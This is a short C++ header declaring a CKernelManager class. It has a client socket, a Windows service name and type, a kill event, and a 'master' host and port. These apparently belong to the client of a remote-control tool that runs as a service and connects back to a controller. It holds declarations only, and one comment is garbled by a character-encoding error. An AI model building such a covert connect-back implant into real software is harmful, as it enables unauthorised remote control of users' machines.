// KernelManager.h: interface for the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////
#pragma once
#include "Manager.h"

class CKernelManager : public CManager  
{
public:
	CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort);
	virtual ~CKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	char	m_strServiceName[256];
	char	m_strKillEvent[256];

	static	char	m_strMasterHost[256];
	static	UINT	m_nMasterPort;
/*	void	UnInstallService();*/
	bool	IsActived();
private:
	HANDLE	m_hThread[10000]; // ◊„πª”√¡À
	UINT	m_nThreadCount;
	DWORD	m_dwServiceType;
	bool	m_bIsActived;
};
